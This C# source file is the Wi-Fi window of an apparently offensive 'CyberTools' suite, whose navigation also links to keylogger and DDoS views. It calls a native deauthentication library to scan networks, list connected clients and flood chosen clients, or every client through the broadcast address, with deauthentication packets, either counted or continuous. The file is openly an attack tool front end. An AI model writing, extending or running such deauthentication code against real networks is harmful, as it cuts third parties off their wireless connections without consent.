using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;

namespace CyberTools.View
{
    public partial class Wifi : Window
    {
        private ObservableCollection<WifiNetwork> availableNetworks;
        private ObservableCollection<WifiClient> connectedClients;

        private WifiNetwork selectedNetwork;
        private CancellationTokenSource attackCancellationToken;

        [DllImport("WifiDeauthLib.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern bool InitializeWifiAdapter(string adapterName);

        [DllImport("WifiDeauthLib.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr ScanNetworks();

        [DllImport("WifiDeauthLib.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr GetClients(string bssid);

        [DllImport("WifiDeauthLib.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern bool SendDeauthPacket(string apMac, string clientMac, int count);

        [DllImport("WifiDeauthLib.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern bool StopDeauthAttack();

        [DllImport("WifiDeauthLib.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr GetAvailableAdapters();

        [DllImport("WifiDeauthLib.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern void FreeMemory(IntPtr ptr);

        public Wifi()
        {
            InitializeComponent();

            availableNetworks = new ObservableCollection<WifiNetwork>();
            connectedClients = new ObservableCollection<WifiClient>();

            NetworksListView.ItemsSource = availableNetworks;
            ClientsListView.ItemsSource = connectedClients;

            LoadNetworkAdapters();

            StartAttackButton.IsEnabled = false;
        }

        private void LoadNetworkAdapters()
        {
            try
            {
                IntPtr adaptersPtr = GetAvailableAdapters();
                if (adaptersPtr != IntPtr.Zero)
                {
                    string adaptersStr = Marshal.PtrToStringAnsi(adaptersPtr);
                    FreeMemory(adaptersPtr);

                    if (!string.IsNullOrEmpty(adaptersStr))
                    {
                        string[] adapters = adaptersStr.Split(';');
                        foreach (string adapter in adapters)
                        {
                            if (!string.IsNullOrWhiteSpace(adapter))
                            {
                                NetworkInterfacesComboBox.Items.Add(adapter);
                            }
                        }

                        if (NetworkInterfacesComboBox.Items.Count > 0)
                        {
                            NetworkInterfacesComboBox.SelectedIndex = 0;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error loading network adapters: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private async void ScanNetworksButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string selectedAdapter = NetworkInterfacesComboBox.SelectedItem as string;
                if (string.IsNullOrEmpty(selectedAdapter))
                {
                    MessageBox.Show("Please select a network adapter.", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                ScanNetworksButton.IsEnabled = false;
                ScanStatusText.Text = "Scanning networks...";
                availableNetworks.Clear();
                connectedClients.Clear();

                await Task.Run(() =>
                {
                    if (!InitializeWifiAdapter(selectedAdapter))
                    {
                        throw new Exception("Failed to initialize the WiFi adapter in monitor mode. Make sure you have appropriate permissions.");
                    }

                    IntPtr networksPtr = ScanNetworks();
                    if (networksPtr != IntPtr.Zero)
                    {
                        string networksStr = Marshal.PtrToStringAnsi(networksPtr);
                        FreeMemory(networksPtr);

                        if (!string.IsNullOrEmpty(networksStr))
                        {
                            string[] networks = networksStr.Split(';');
                            foreach (string network in networks)
                            {
                                if (!string.IsNullOrWhiteSpace(network))
                                {
                                    string[] parts = network.Split(',');
                                    if (parts.Length >= 4)
                                    {
                                        Dispatcher.Invoke(() =>
                                        {
                                            availableNetworks.Add(new WifiNetwork
                                            {
                                                SSID = parts[0],
                                                BSSID = parts[1],
                                                Channel = parts[2],
                                                SignalStrength = parts[3]
                                            });
                                        });
                                    }
                                }
                            }
                        }
                    }
                });

                ScanNetworksButton.IsEnabled = true;
                ScanStatusText.Text = $"Found {availableNetworks.Count} networks";
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error scanning networks: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                ScanNetworksButton.IsEnabled = true;
                ScanStatusText.Text = "Scan failed.";
            }
        }

        private async void NetworksListView_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                selectedNetwork = NetworksListView.SelectedItem as WifiNetwork;
                if (selectedNetwork != null)
                {
                    connectedClients.Clear();
                    StartAttackButton.IsEnabled = false;

                    await Task.Run(() =>
                    {
                        IntPtr clientsPtr = GetClients(selectedNetwork.BSSID);
                        if (clientsPtr != IntPtr.Zero)
                        {
                            string clientsStr = Marshal.PtrToStringAnsi(clientsPtr);
                            FreeMemory(clientsPtr);

                            if (!string.IsNullOrEmpty(clientsStr))
                            {
                                string[] clients = clientsStr.Split(';');
                                foreach (string client in clients)
                                {
                                    if (!string.IsNullOrWhiteSpace(client))
                                    {
                                        string[] parts = client.Split(',');
                                        if (parts.Length >= 3)
                                        {
                                            Dispatcher.Invoke(() =>
                                            {
                                                connectedClients.Add(new WifiClient
                                                {
                                                    MacAddress = parts[0],
                                                    SignalStrength = parts[1],
                                                    LastSeen = parts[2]
                                                });
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    });

                    StartAttackButton.IsEnabled = true;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error loading clients: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private async void StartAttackButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (selectedNetwork == null)
                {
                    MessageBox.Show("Please select a network first.", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                bool targetAllClients = TargetAllClientsCheckBox.IsChecked ?? false;
                List<WifiClient> targetClients = new List<WifiClient>();

                if (!targetAllClients)
                {
                    foreach (WifiClient client in ClientsListView.SelectedItems)
                    {
                        targetClients.Add(client);
                    }

                    if (targetClients.Count == 0)
                    {
                        MessageBox.Show("Please select at least one client or check 'Target All Clients'.", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                        return;
                    }
                }
                else
                {
                    foreach (WifiClient client in connectedClients)
                    {
                        targetClients.Add(client);
                    }

                    targetClients.Add(new WifiClient { MacAddress = "FF:FF:FF:FF:FF:FF" });
                }

                int packetCount = 0;
                ComboBoxItem selectedItem = PacketCountComboBox.SelectedItem as ComboBoxItem;
                if (selectedItem != null && selectedItem.Content.ToString() != "Continuous")
                {
                    int.TryParse(selectedItem.Content.ToString(), out packetCount);
                }

                StartAttackButton.IsEnabled = false;
                StopAttackButton.IsEnabled = true;
                NetworksListView.IsEnabled = false;
                ClientsListView.IsEnabled = false;
                ScanNetworksButton.IsEnabled = false;
                AttackStatusText.Text = "Attack in progress...";
                AttackProgressBar.Visibility = Visibility.Visible;

                attackCancellationToken = new CancellationTokenSource();

                await Task.Run(() =>
                {
                    try
                    {
                        foreach (WifiClient client in targetClients)
                        {
                            if (attackCancellationToken.IsCancellationRequested)
                                break;

                            SendDeauthPacket(selectedNetwork.BSSID, client.MacAddress, packetCount);
                        }
                    }
                    catch (Exception ex)
                    {
                        Dispatcher.Invoke(() =>
                        {
                            MessageBox.Show($"Error during attack: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                        });
                    }
                }, attackCancellationToken.Token);

                if (!attackCancellationToken.IsCancellationRequested)
                {
                    StopAttack();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error starting attack: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                StopAttack();
            }
        }

        private void StopAttackButton_Click(object sender, RoutedEventArgs e)
        {
            StopAttack();
        }

        private void StopAttack()
        {
            try
            {
                if (attackCancellationToken != null)
                {
                    attackCancellationToken.Cancel();
                    StopDeauthAttack();
                }

                StartAttackButton.IsEnabled = true;
                StopAttackButton.IsEnabled = false;
                NetworksListView.IsEnabled = true;
                ClientsListView.IsEnabled = true;
                ScanNetworksButton.IsEnabled = true;
                AttackStatusText.Text = "Attack stopped.";
                AttackProgressBar.Visibility = Visibility.Collapsed;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error stopping attack: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void Main_Click(object sender, RoutedEventArgs e)
        {
            CyberTools.MainWindow MainWindow = new CyberTools.MainWindow();
            MainWindow.Show();
            this.Close();
        }


        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                this.DragMove();
            }
        }


        private void Keylogger_Click(object sender, RoutedEventArgs e)
        {
            CyberTools.View.KeyLoggerView keyLoggerView = new CyberTools.View.KeyLoggerView();
            keyLoggerView.Show();
            this.Close();
        }

        private void Wifi_Click(object sender, RoutedEventArgs e)
        {
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }

        private void MinimizeButton_Click(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void Portscanner_Click(object sender, RoutedEventArgs e)
        {
            CyberTools.View.portscanner portscanner = new CyberTools.View.portscanner();
            portscanner.Show();
            this.Close();
        }

        private void network_Click(object sender, RoutedEventArgs e)
        {
            CyberTools.View.NetworkScanner Networkscanner = new CyberTools.View.NetworkScanner();
            Networkscanner.Show();
            this.Close();
        }

        private void Ddos_Click(object sender, RoutedEventArgs e)
        {
            CyberTools.View.Ddos ddos = new CyberTools.View.Ddos();
            ddos.Show();
            this.Close();
        }
    }

    public class WifiNetwork
    {
        public string ?SSID { get; set; }
        public string ?BSSID { get; set; }
        public string ?Channel { get; set; }
        public string ?SignalStrength { get; set; }
    }



    public class WifiClient
    {
        public string ?MacAddress { get; set; }
        public string ?SignalStrength { get; set; }
        public string ?LastSeen { get; set; }
    }
}